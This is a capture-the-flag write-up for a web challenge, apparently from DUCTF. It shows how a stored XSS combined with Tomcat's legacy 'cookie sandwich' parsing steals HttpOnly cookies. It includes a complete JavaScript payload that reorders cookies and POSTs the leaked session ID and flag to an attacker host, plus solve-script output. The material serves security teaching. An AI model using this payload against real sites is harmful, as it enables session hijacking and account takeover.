Sweet Treat
============

## Background

The challenge is meant to demonstrate the existence and exploitation of a technique known as the "Cookie Sandwiching" attack, where an attacker is able to steal cookies even if they have the HttpOnly attribute set to true which is usually the reason why many XSS findings end up not having enough of an impact during Pentests or bug bounties.

More about this type of vulnerability can be found here:

- [Stealing HTTPOnly Cookies with the Cookie Sandwich Technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)
- [Bypassing WAFs with the Phantom Version Cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)

If you want to just run the script instead its in the [#Script] section.

## Identification

Checking the Dockerfile reveals the image in use is a `tomcat:9.0-jdk11` image. Apache tomcat uses a Legacy Cookie Processor by default in addition to the standard cookie processor to support older browsers/versions of cookies. More information on this can be found in [Tomcat's documentation](https://tomcat.apache.org/tomcat-9.0-doc/config/cookie-processor.html) (Check for RFC 2109).

Essentially, this allows an attacker to add cookies with the name `$Version` to downgrade the cookie versions to force the browser to utilise legacy cookie processor to read and operate on cookies.

Checking the application source code, we can see that there are multiple places where user input is being reflected, most of it is being escaped through an inbuilt html escaping function, however, there is one place where this is not in use i.e. the aboutme section where its being reflected into the `admin/admin-review.jsp` page without sanitisation leading to an XSS vulnerability. The vulnerability exists in this bit of code:

```jsp
<div class="about-content"><%= (aboutMe != null && !aboutMe.isEmpty()) ? aboutMe : "No about me section provided." %></div>
```

We now have a way to add cookies for the user, however, this by itself won't allow full exploitation. The cookie order matters just as much since we want the other cookies that the user has to be the "value" of our added cookie, and for this we need the cookie to come after our malicious cookie. Essentially we want the structure to be something like this:

```
$Version=1; steal="; <User's Cookies>; end="; 
```

Doing the above will make the user's cookies the value of the steal cookie, for example, if the user has cookie JSESSIONID, then the value of steal will be something like this:

```
steal="JSESSIONID=XXXX; end="
```

Although, this has a very important requirement i.e. Some type of cookie reflection. This doesn't strictly have to be on the current page, it can be anywhere that supports the legacy cookie parser and reflects ANY of the user cookies back to the user. Often we can see cookies like Timezone, language, themes, preferences, etc that are used for the user's personalisation. These aren't always used in the source of the page, but in this case we can see that the cookie `language` is being read and reflected inside the source of the page, for example, in `index.jsp` we have this bit of code:

```java
  String lang = "en";
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      for (Cookie c : cookies) {
          if ("language".equals(c.getName())) {
              lang = c.getValue();
          }
      }
  }

--- SNIP ---

<!DOCTYPE html>
<html lang="<%= lang %>"> // Here is where we are injecting
```

This is now our target where we will be getting our cookie value reflected, the expected behaviour for this is not properly accounted for and allows arbitrary values to be set.

Now we just have to figure out a way to get the cookie order right to utilise the XSS, and cookie sandwiching attack to get the exploit working. This can be done by abusing the way that cookies are ordered when they are sent to the server. This [blog post](https://blog.ankursundara.com/cookie-bugs/) hints at how cookies are ordered by the Path (longest to shortest) and last updated time (least recent to most recent).

The attacker's cookies can be reordered by specifiying a path, which can be done by adding `/index.jsp` to the path.

## Exploitation

In order to properly exploit and steal the flag using cookie sandwiching we have confirmed the existence of pre-requisites:

- A place where the cookie is being reflected - In this case we can use the `index.jsp` page where language cookie is being read and printed.
- A way to set the cookies in a way where the cookie order allows us to capture the other user cookies inside another cookie's value - This can be done by assigning a longer path to the cookie.
- XSS vulnerability that will be used to do all of the above - About me section, and we can report the profile content to the admin user who has the flag cookie. In a real world scenario this might just require us to wait for another user to somehow interact with a page that holds our payload. (Obviously)

The final payload now can be formed to be this:

```html
<script>
document.cookie = `$Version=1; path=/index.jsp;`;
document.cookie = `language="start; path=/index.jsp;`;
document.cookie = `end="; path=/`;
fetch("/index.jsp").then(function (res){return res.text();}).then(
function (html) {
    console.log("Sending exfil");
    fetch("http://<attacker_lhost>:<attacker_lport>/exfil",
    {
        method: "POST",
        body: html.substring(0,135)
    });
});
</script>
```

All that needs to be done now is inject this into the about me section of a user, and hit the report button button for a profile from the `index.jsp`, or the `edit_profile.jsp` page.

**Reproducing**

1. Creating a new user through register functionality.
2. Adding the payload with the values for the attacker controlled IP changed (alternatively you can post that data to populate the admin user's about me section and then using the dumped JSESSIONID cookie to login as the admin user and viewing the about me section for the admin user through `edit_profile.jsp` page.)
3. Report the profile to the administrator, and force admin interaction.
4. Lose sleep?

## Script

Run the script by specifying the required parameters:

```
python3 solve.py --lhost <attacker_ip> --url http[s]://<challenge_url>/ --lport <attacker_port_for_http_listener>
```

Output:

```
[+] Running HTTP Server on port %s to catch admin interaction 8002
[+] User registered and logged in successfully
[+] Injecting XSS payload into the admin page
[+] XSS payload sent, waiting for admin interaction...
172.18.0.2 - - [01/Jun/2025 13:33:44] "POST /exfil HTTP/1.1" 200 -
[+] XSS payload executed, received data:
[+] Flag:  DUCTF{1_th0ught_y0u_c0uldnt_st34l_th3m}
[+] JSESSIONID:  DFEF73BAC6CB76DC912732F24C35AF8A
[+] Data:  <!DOCTYPE html>
<html lang=""start; JSESSIONID=DFEF73BAC6CB76DC912732F24C35AF8A; flag=DUCTF{1_th0ught_y0u_c0uldnt_st34l_th3m}; end=
[+] Admin interaction detected, shutting down server...
```
